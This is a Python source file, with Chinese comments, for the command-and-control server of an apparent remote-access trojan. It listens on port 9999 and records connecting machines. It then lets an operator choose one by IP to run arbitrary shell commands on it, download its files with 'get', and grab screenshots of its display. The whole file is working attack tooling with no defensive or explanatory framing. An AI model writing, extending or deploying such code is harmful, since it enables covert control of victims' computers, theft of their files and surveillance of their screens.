import socket
import select
from PIL import Image


def f_data(client_1, cmd):  # 取回文件处理
    client_1.sendall(bytes(cmd, 'utf-8'))
    f_name = cmd.split()[1]
    f = open(f_name, 'wb')
    while True:
        data = client_1.recv(8000)
        if data == b'stop':
            break
        f.write(data)
    print('%s  下载完成！' % f_name)
    f.close()


def ImageGrab(client_1, cmd):  # 远程截图处理
    client_1.sendall(bytes(cmd, 'utf-8'))
    x = b''
    while True:
        data = client_1.recv(8000)
        # print(data)
        if data == b'stop':
            break
        x = x + data
    im = Image.frombytes(mode='RGB', size=(1024, 768), data=x)
    im.show()


def cmd_start(client_1, cmd, ip):
    try:
        client_1.sendall(bytes(cmd, 'utf-8'))
        data = client_1.recv(8000)

        print(str(data, 'utf-8'))
    except:
        del host_list[ip]
        print('执行失败，请查看客户端是否退出！')
        return (1)


if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    host_port = ('', 9999)
    s.bind(host_port)

    s.listen(10)
    host_list = {}
    time = 0.1
    while True:

        infds, outfds, errfds = select.select([s, ], [], [], time)
        # print(infds)
        # 如果infds状态改变,进行处理,否则不予理会
        if len(infds) != 0:
            time = 0.1
            client, addr = s.accept()
            host_list[addr[0]] = client
        else:
            if len(host_list) == 0:
                print('没有主机上线请等待...')
                time = 5
                continue
        del_ip = ''
        ip = input('ip::').strip()
        if ip == 'ls' and len(host_list) != 0:
            for i in host_list.items():
                client_2 = i[1]
                try:
                    client_2.sendall(bytes('hello', 'utf-8'))
                    print(i[0])

                except:
                    print('发送失败')

            continue

        elif ip in host_list.keys():  # 如果用户输入的ip地址属于主机列表，就发送接收cmd命令！
            while True:
                client_1 = host_list[ip]
                cmd = input('cmd:')
                if cmd == 'exit':
                    break

                elif cmd == '':
                    continue

                elif cmd.split()[0] == 'get':   # 文件取回
                    f_data(client_1, cmd)
                    continue
                elif cmd == 'ImageGrab':  # 屏幕截图
                    ImageGrab(client_1, cmd)
                    continue
                else:
                    if cmd_start(client_1, cmd, ip) == 1:
                        break  # cmd
        else:
            continue  # 跳到循环开头检查主机上线
